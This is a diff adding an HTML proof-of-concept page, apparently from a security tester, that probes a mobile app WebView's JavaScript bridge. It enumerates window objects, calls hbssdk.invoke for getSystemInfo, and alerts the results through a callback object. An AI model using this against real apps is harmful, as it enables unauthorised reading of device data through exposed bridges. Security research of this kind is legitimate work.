@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+<table height=100% width=100%><tr><td>L.O.Team</td></tr></table>
+<script>
+var msg="";
+for(i in window ){  
+  msg+=i;
+msg+="\r\n";  
+  //msg+=test[i];  
+}  
+alert(msg);
+setTimeout("getinfo()",10);
+function getinfo() {
+var para="{'_appId':'1','_method':'getSystemInfo','_args':'{}','_index':'1'}";
+window.hbssdk.invoke(para);
+//alert(/xss/);
+}
+
+function Car(){
+var ocar = new Object;
+ocar.callback = function(str1,str2,int1){
+  alert(str1);
+  alert(JSON.stringify(str2));
+  alert(int1);
+};
+return ocar;
+}
+var hbs = Car();
+//hbs.callback("a","b",1);
+</script>
+</body>
+</html>
